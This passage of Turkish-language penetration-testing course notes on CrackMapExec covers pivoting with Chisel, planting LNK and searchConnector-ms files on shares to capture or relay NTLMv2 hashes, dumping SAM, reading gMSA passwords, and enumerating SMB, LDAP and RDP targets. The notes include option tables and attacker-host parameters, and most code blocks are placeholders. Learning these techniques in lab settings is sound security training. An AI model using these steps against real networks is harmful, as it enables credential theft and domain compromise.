### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

